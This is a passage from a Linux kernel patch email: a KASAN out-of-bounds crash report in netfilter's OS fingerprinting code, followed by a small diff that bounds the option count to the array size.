 nf_hook_slow+0xc5/0x1f0 linux-6.0-rc4/net/netfilter/core.c:620
 nf_hook linux-6.0-rc4/./include/linux/netfilter.h:262
 NF_HOOK linux-6.0-rc4/./include/linux/netfilter.h:305
 ip_local_deliver+0x2f5/0x4e0 linux-6.0-rc4/net/ipv4/ip_input.c:254
 dst_input linux-6.0-rc4/./include/net/dst.h:461
 ip_rcv_finish+0x1cb/0x2f0 linux-6.0-rc4/net/ipv4/ip_input.c:444
 NF_HOOK linux-6.0-rc4/./include/linux/netfilter.h:307
 NF_HOOK linux-6.0-rc4/./include/linux/netfilter.h:301
 ip_rcv+0xc4/0x3b0 linux-6.0-rc4/net/ipv4/ip_input.c:564
 __netif_receive_skb_one_core+0x114/0x180 linux-6.0-rc4/net/core/dev.c:5485
 __netif_receive_skb+0x1f/0x1c0 linux-6.0-rc4/net/core/dev.c:5599
 process_backlog+0x13a/0x690 linux-6.0-rc4/net/core/dev.c:5927
 __napi_poll.constprop.0+0xaf/0x430 linux-6.0-rc4/net/core/dev.c:6511
 napi_poll linux-6.0-rc4/net/core/dev.c:6578
 net_rx_action+0x8d2/0xc60 linux-6.0-rc4/net/core/dev.c:6689
 __do_softirq+0x1d3/0x9b3 linux-6.0-rc4/kernel/softirq.c:571
 do_softirq linux-6.0-rc4/kernel/softirq.c:472
 do_softirq+0x101/0x140 linux-6.0-rc4/kernel/softirq.c:459
 </IRQ>
 <TASK>
 __local_bh_enable_ip+0xf4/0x110 linux-6.0-rc4/kernel/softirq.c:396
 local_bh_enable linux-6.0-rc4/./include/linux/bottom_half.h:33
 rcu_read_unlock_bh linux-6.0-rc4/./include/linux/rcupdate.h:776
 ip_finish_output2+0x7d6/0x21a0 linux-6.0-rc4/net/ipv4/ip_output.c:229
 __ip_finish_output linux-6.0-rc4/net/ipv4/ip_output.c:306
 __ip_finish_output+0x396/0x650 linux-6.0-rc4/net/ipv4/ip_output.c:288
 ip_finish_output+0x2d/0x280 linux-6.0-rc4/net/ipv4/ip_output.c:316
 NF_HOOK_COND linux-6.0-rc4/./include/linux/netfilter.h:296
 ip_output+0x20a/0x620 linux-6.0-rc4/net/ipv4/ip_output.c:430
 dst_output linux-6.0-rc4/./include/net/dst.h:451
 ip_local_out linux-6.0-rc4/net/ipv4/ip_output.c:126
 __ip_queue_xmit+0x8de/0x1bd0 linux-6.0-rc4/net/ipv4/ip_output.c:532
 __tcp_transmit_skb+0x195b/0x3820 linux-6.0-rc4/net/ipv4/tcp_output.c:1402
 tcp_transmit_skb linux-6.0-rc4/net/ipv4/tcp_output.c:1420
 tcp_write_xmit+0xd9b/0x5f70 linux-6.0-rc4/net/ipv4/tcp_output.c:2691
 __tcp_push_pending_frames+0xaa/0x380 linux-6.0-rc4/net/ipv4/tcp_output.c:2875
 tcp_push+0x49b/0x720 linux-6.0-rc4/net/ipv4/tcp.c:728
 tcp_sendmsg_locked+0x2480/0x2fc0 linux-6.0-rc4/net/ipv4/tcp.c:1455
 tcp_sendmsg+0x2b/0x40 linux-6.0-rc4/net/ipv4/tcp.c:1483
 inet_sendmsg+0x99/0xe0 linux-6.0-rc4/net/ipv4/af_inet.c:819
 sock_sendmsg_nosec linux-6.0-rc4/net/socket.c:714
 sock_sendmsg+0xcf/0x120 linux-6.0-rc4/net/socket.c:734
 sock_write_iter+0x291/0x3d0 linux-6.0-rc4/net/socket.c:1108
 call_write_iter linux-6.0-rc4/./include/linux/fs.h:2187
 new_sync_write linux-6.0-rc4/fs/read_write.c:491
 vfs_write+0x9ef/0xde0 linux-6.0-rc4/fs/read_write.c:578
 ksys_write+0x1e8/0x250 linux-6.0-rc4/fs/read_write.c:631
 do_syscall_x64 linux-6.0-rc4/arch/x86/entry/common.c:50
 do_syscall_64+0x35/0xb0 linux-6.0-rc4/arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x63/0xcd linux-6.0-rc4/arch/x86/entry/entry_64.S:120
RIP: 0033:0x7f1674040fef
Code: 89 54 24 18 48 89 74 24 10 89 7c 24 08 e8 29 fd ff ff 48 8b 54 24 18 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 01 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 31 44 89 c7 48 89 44 24 08 e8 5c fd ff ff 48
RSP: 002b:00007ffe90523f50 EFLAGS: 00000293 ORIG_RAX: 0000000000000001
RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f1674040fef
RDX: 0000000000000080 RSI: 00007ffe90524030 RDI: 0000000000000006
RBP: 00007ffe905240d0 R08: 0000000000000000 R09: 0000000000000000
R10: 0000560534f9b61f R11: 0000000000000293 R12: 0000560534f9c1b0
R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
 </TASK>

Allocated by task 6431:
 kasan_save_stack+0x1e/0x40 linux-6.0-rc4/mm/kasan/common.c:38
 kasan_set_track linux-6.0-rc4/mm/kasan/common.c:45
 set_alloc_info linux-6.0-rc4/mm/kasan/common.c:437
 ____kasan_kmalloc linux-6.0-rc4/mm/kasan/common.c:516
 ____kasan_kmalloc linux-6.0-rc4/mm/kasan/common.c:475
 __kasan_kmalloc+0xa6/0xd0 linux-6.0-rc4/mm/kasan/common.c:525
 kasan_kmalloc linux-6.0-rc4/./include/linux/kasan.h:234
 kmem_cache_alloc_trace+0x25a/0x460 linux-6.0-rc4/mm/slab.c:3559
 kmalloc linux-6.0-rc4/./include/linux/slab.h:600
 nfnl_osf_add_callback+0x11f/0x550 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:316
 nfnetlink_rcv_msg+0xbcf/0x13f0 linux-6.0-rc4/net/netfilter/nfnetlink.c:300
 netlink_rcv_skb+0x153/0x420 linux-6.0-rc4/net/netlink/af_netlink.c:2501
 nfnetlink_rcv+0x1ac/0x420 linux-6.0-rc4/net/netfilter/nfnetlink.c:658
 netlink_unicast_kernel linux-6.0-rc4/net/netlink/af_netlink.c:1319
 netlink_unicast+0x543/0x7f0 linux-6.0-rc4/net/netlink/af_netlink.c:1345
 netlink_sendmsg+0x918/0xe20 linux-6.0-rc4/net/netlink/af_netlink.c:1921
 sock_sendmsg_nosec linux-6.0-rc4/net/socket.c:714
 sock_sendmsg+0xcf/0x120 linux-6.0-rc4/net/socket.c:734
 ____sys_sendmsg+0x6e6/0x800 linux-6.0-rc4/net/socket.c:2482
 ___sys_sendmsg+0x11d/0x1b0 linux-6.0-rc4/net/socket.c:2536
 __sys_sendmsg+0xfa/0x1d0 linux-6.0-rc4/net/socket.c:2565
 do_syscall_x64 linux-6.0-rc4/arch/x86/entry/common.c:50
 do_syscall_64+0x35/0xb0 linux-6.0-rc4/arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x63/0xcd linux-6.0-rc4/arch/x86/entry/entry_64.S:120

Last potentially related work creation:
 kasan_save_stack+0x1e/0x40 linux-6.0-rc4/mm/kasan/common.c:38
 __kasan_record_aux_stack+0x7e/0x90 linux-6.0-rc4/mm/kasan/generic.c:348
 kvfree_call_rcu+0x74/0x940 linux-6.0-rc4/kernel/rcu/tree.c:3322
 put_css_set_locked linux-6.0-rc4/kernel/cgroup/cgroup.c:988
 put_css_set_locked+0xa9c/0x1000 linux-6.0-rc4/kernel/cgroup/cgroup.c:954
 put_css_set linux-6.0-rc4/kernel/cgroup/cgroup-internal.h:211
 put_css_set linux-6.0-rc4/kernel/cgroup/cgroup-internal.h:198
 cgroup_free+0x83/0x1b0 linux-6.0-rc4/kernel/cgroup/cgroup.c:6525
 __put_task_struct+0x113/0x3d0 linux-6.0-rc4/kernel/fork.c:840
 put_task_struct linux-6.0-rc4/./include/linux/sched/task.h:119
 delayed_put_task_struct+0x1f1/0x330 linux-6.0-rc4/kernel/exit.c:177
 rcu_do_batch linux-6.0-rc4/kernel/rcu/tree.c:2245
 rcu_core+0x7bb/0x1850 linux-6.0-rc4/kernel/rcu/tree.c:2505
 __do_softirq+0x1d3/0x9b3 linux-6.0-rc4/kernel/softirq.c:571

The buggy address belongs to the object at ffff88804bc64000
 which belongs to the cache kmalloc-1k of size 1024
The buggy address is located 626 bytes inside of
 1024-byte region [ffff88804bc64000, ffff88804bc64400)

The buggy address belongs to the physical page:
page:ffffea00012f1900 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x4bc64
flags: 0x4fff00000000200(slab|node=1|zone=1|lastcpupid=0x7ff)
raw: 04fff00000000200 ffffea0001023808 ffffea00012f1f08 ffff888011840700
raw: 0000000000000000 ffff88804bc64000 0000000100000002 0000000000000000
page dumped because: kasan: bad access detected
page_owner tracks the page as allocated
page last allocated via order 0, migratetype Unmovable, gfp_mask 0x2420c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_COMP|__GFP_THISNODE), pid 1, tgid 1 (systemd), ts 22208538581, free_ts 22201347598
 prep_new_page linux-6.0-rc4/mm/page_alloc.c:2532
 get_page_from_freelist+0x1082/0x2ae0 linux-6.0-rc4/mm/page_alloc.c:4283
 __alloc_pages+0x1c7/0x510 linux-6.0-rc4/mm/page_alloc.c:5515
 __alloc_pages_node linux-6.0-rc4/./include/linux/gfp.h:243
 kmem_getpages linux-6.0-rc4/mm/slab.c:1363
 cache_grow_begin+0x75/0x370 linux-6.0-rc4/mm/slab.c:2569
 cache_alloc_refill+0x27e/0x380 linux-6.0-rc4/mm/slab.c:2942
 ____cache_alloc linux-6.0-rc4/mm/slab.c:3018
 ____cache_alloc linux-6.0-rc4/mm/slab.c:3001
 slab_alloc_node linux-6.0-rc4/mm/slab.c:3220
 kmem_cache_alloc_node_trace+0x4f5/0x560 linux-6.0-rc4/mm/slab.c:3601
 __do_kmalloc_node linux-6.0-rc4/mm/slab.c:3623
 __kmalloc_node+0x38/0x60 linux-6.0-rc4/mm/slab.c:3631
 kmalloc_node linux-6.0-rc4/./include/linux/slab.h:623
 kvmalloc_node+0x3e/0x190 linux-6.0-rc4/mm/util.c:613
 kvzalloc_node linux-6.0-rc4/./include/linux/slab.h:754
 alloc_shrinker_info+0xe9/0x290 linux-6.0-rc4/mm/vmscan.c:282
 mem_cgroup_css_online+0x182/0x470 linux-6.0-rc4/mm/memcontrol.c:5292
 online_css+0xaf/0x2a0 linux-6.0-rc4/kernel/cgroup/cgroup.c:5334
 css_create linux-6.0-rc4/kernel/cgroup/cgroup.c:5405
 cgroup_apply_control_enable+0x69f/0xc00 linux-6.0-rc4/kernel/cgroup/cgroup.c:3204
 cgroup_mkdir+0x5a0/0x1300 linux-6.0-rc4/kernel/cgroup/cgroup.c:5602
 kernfs_iop_mkdir+0x146/0x1d0 linux-6.0-rc4/fs/kernfs/dir.c:1185
 vfs_mkdir+0x3a9/0x650 linux-6.0-rc4/fs/namei.c:4013
 do_mkdirat+0x28c/0x310 linux-6.0-rc4/fs/namei.c:4038
 __do_sys_mkdir linux-6.0-rc4/fs/namei.c:4058
 __se_sys_mkdir linux-6.0-rc4/fs/namei.c:4056
 __x64_sys_mkdir+0xf2/0x140 linux-6.0-rc4/fs/namei.c:4056
page last free stack trace:
 reset_page_owner linux-6.0-rc4/./include/linux/page_owner.h:24
 free_pages_prepare linux-6.0-rc4/mm/page_alloc.c:1449
 free_pcp_prepare+0x4b0/0xb50 linux-6.0-rc4/mm/page_alloc.c:1499
 free_unref_page_prepare linux-6.0-rc4/mm/page_alloc.c:3380
 free_unref_page+0x19/0x520 linux-6.0-rc4/mm/page_alloc.c:3476
 tlb_batch_list_free linux-6.0-rc4/mm/mmu_gather.c:74
 tlb_finish_mmu+0x1a3/0x7e0 linux-6.0-rc4/mm/mmu_gather.c:356
 exit_mmap+0x1d2/0x480 linux-6.0-rc4/mm/mmap.c:3118
 __mmput+0x122/0x4b0 linux-6.0-rc4/kernel/fork.c:1187
 mmput+0x56/0x60 linux-6.0-rc4/kernel/fork.c:1208
 exit_mm linux-6.0-rc4/kernel/exit.c:510
 do_exit+0x9d9/0x29b0 linux-6.0-rc4/kernel/exit.c:782
 do_group_exit+0xd2/0x2f0 linux-6.0-rc4/kernel/exit.c:925
 __do_sys_exit_group linux-6.0-rc4/kernel/exit.c:936
 __se_sys_exit_group linux-6.0-rc4/kernel/exit.c:934
 __x64_sys_exit_group+0x3a/0x50 linux-6.0-rc4/kernel/exit.c:934
 do_syscall_x64 linux-6.0-rc4/arch/x86/entry/common.c:50
 do_syscall_64+0x35/0xb0 linux-6.0-rc4/arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x63/0xcd linux-6.0-rc4/arch/x86/entry/entry_64.S:120

Memory state around the buggy address:
 ffff88804bc64100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 ffff88804bc64180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
>ffff88804bc64200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc
                                                             ^
 ffff88804bc64280: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
 ffff88804bc64300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc

Reported-by: Lucas Leong <wmliang@infosec.exchange>
Cc: stable@kernel.org
Signed-off-by: Wander Lairson Costa <wander@redhat.com>
---
 net/netfilter/nfnetlink_osf.c | 5 +++--
 1 file changed, 3 insertions(+), 2 deletions(-)

diff --git a/net/netfilter/nfnetlink_osf.c b/net/netfilter/nfnetlink_osf.c
index 8f1bfa6ccc2d..3a0487560c89 100644
--- a/net/netfilter/nfnetlink_osf.c
+++ b/net/netfilter/nfnetlink_osf.c
@@ -70,6 +70,7 @@ static bool nf_osf_match_one(const struct sk_buff *skb,
 	unsigned int check_WSS = 0;
 	int fmatch = FMATCH_WRONG;
 	int foptsize, optnum;
+	int opt_num = min_t(__u16, f->opt_num, ARRAY_SIZE(f->opt));
 	u16 mss = 0;
 
 	if (ctx->totlen != f->ss || !nf_osf_ttl(skb, ttl_check, f->ttl))
@@ -84,7 +85,7 @@ static bool nf_osf_match_one(const struct sk_buff *skb,
 	/* Check options */
 
 	foptsize = 0;
-	for (optnum = 0; optnum < f->opt_num; ++optnum)
+	for (optnum = 0; optnum < opt_num; ++optnum)
 		foptsize += f->opt[optnum].length;
 
 	if (foptsize > MAX_IPOPTLEN ||
@@ -94,7 +95,7 @@ static bool nf_osf_match_one(const struct sk_buff *skb,
 
 	check_WSS = f->wss.wc;
 
-	for (optnum = 0; optnum < f->opt_num; ++optnum) {
+	for (optnum = 0; optnum < opt_num; ++optnum) {
 		if (f->opt[optnum].kind == *ctx->optp) {
 			__u32 len = f->opt[optnum].length;
 			const __u8 *optend = ctx->optp + len;
-- 
2.41.0

